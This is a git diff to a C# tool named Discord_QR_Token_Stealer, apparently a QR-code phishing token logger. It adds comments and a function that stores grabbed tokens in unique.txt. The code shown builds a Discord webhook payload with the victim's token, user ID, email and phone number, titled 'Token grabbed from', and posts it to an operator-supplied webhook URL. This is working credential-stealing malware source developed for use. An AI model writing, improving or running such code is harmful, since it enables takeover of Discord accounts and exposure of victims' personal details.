@@ -10,6 +10,7 @@ using System.Net;
 using Newtonsoft.Json;
 using System.Diagnostics;
 using System.Text;
+using System.Linq;
 
 namespace Discord_QR_Token_Stealer
 {
@@ -215,6 +216,9 @@ namespace Discord_QR_Token_Stealer
 
             // send the webhook
             sendWebhook();
+
+            // add to uniques.txt
+            addToUniques(token);
         }
 
         // says its loaded
@@ -317,8 +321,10 @@ namespace Discord_QR_Token_Stealer
             File.WriteAllText("webhook.txt", webhookUrl);
         }
 
+        // this sends the webhook to discord
         void sendWebhook()
         {
+            // make sure the webhook is valid
             if (webhookUrl == string.Empty)
             {
                 createLog("Skipping webhook, no URL supplied");
@@ -329,20 +335,24 @@ namespace Discord_QR_Token_Stealer
                 return;
             }
             
+            // make sure token is valid
             if (tokenInfo == null)
             {
                 createLog("Skipping webhook, token information was null");
                 return;
             }
 
+            // if the tokenInfos avatar is null, replace it with sniffcat
             string av;
             if (tokenInfo.Avatar == null)
                 av = "https://raw.githubusercontent.com/verlox/Discord-QR-Token-Logger/master/Discord-QR-Token-Stealer/sniffcat.jpg";
             else
                 av = $"https://cdn.discordapp.com/avatars/{tokenInfo.Id}/{tokenInfo.Avatar}.png";
 
+            // crash prevention
             try
             {
+                // the actual body in JSON format
                 var body = "{\"embeds\":[{\"title\":\"Token grabbed from " + $"{tokenInfo.Username}#{tokenInfo.Discriminator}" + "!\",\"description\":\"`" + tokenInfo.Token + "`\",\"color\":\"7407103\",\"thumbnail\":{\"url\":\"" + av + "\"},\"fields\":[{\"name\": \"ID\", \"value\": \"" + tokenInfo.Id + "\"},{\"name\":\"Email\",\"value\":\"" + tokenInfo.Email + "\"},{\"name\":\"Phone\",\"value\":\"" + tokenInfo.Phone + "\"}],\"timestamp\":\"" + DateTime.Now.ToUniversalTime().ToString("o") + "\",\"footer\":{\"text\":\"made by verlox.cc\"}}],\"avatar_url\":\"https://raw.githubusercontent.com/verlox/Discord-QR-Token-Logger/master/Discord-QR-Token-Stealer/sniffcat.jpg\",\"username\":\"lithhook\"}";
 
                 // log body to debug
@@ -350,10 +360,10 @@ namespace Discord_QR_Token_Stealer
 
                 // make request and set settings
                 var req = WebRequest.Create(webhookUrl);
-                req.Method = "POST";
+                req.Method = "POST"; // POST request, very important
                 req.ContentType = "application/json";
 
-                // convert to bytes so we can write it as the body
+                // convert to bytes so we can write it as the body, stream.write requires bytes
                 var bytes = Encoding.UTF8.GetBytes(body);
                 req.GetRequestStream().Write(bytes, 0, bytes.Length);
 
@@ -370,8 +380,10 @@ namespace Discord_QR_Token_Stealer
             }
         }
 
+        // create a log in the logbox, use this method so that we dont keep checking if invoke is required and shit
         void createLog(string text)
         {
+            // if required, invoke it, else, just add it
             if (logBox.InvokeRequired)
             {
                 logBox.Invoke((MethodInvoker)(() =>
@@ -386,6 +398,7 @@ namespace Discord_QR_Token_Stealer
             }
         }
 
+        // clear labels and reset timer
         void clearInfo()
         {
             // more lazy crash protection
@@ -419,16 +432,24 @@ namespace Discord_QR_Token_Stealer
 
         public void addToUniques(string token)
         {
-            //string[] tokens = { };
-            //if (File.Exists("unique.txt"))
-            //    tokens = File.ReadAllText("unique.txt").Split('\n');
+            // instantiate new list
+            var tokens = new List<string>();
 
-            //if (tokens[token] == null)
-            //    File.AppendAllText("unique.txt", $"{token}\n");
+            // make sure it exists, if it does, read it to tokens var
+            if (File.Exists("unique.txt"))
+                tokens = File.ReadAllLines("unique.txt").ToList();
+
+            // if its not already in there, then add it
+            if (!tokens.Contains(token))
+            {
+                // add it to the file
+                File.AppendAllText("unique.txt", $"{token}\n");
+                createLog("Updated unique.txt");
+            }
         }
     }
 
-    // class that data from tokens
+    // class that data from tokens gets imported into
     public class TokenInformation
     {
         public string Token;
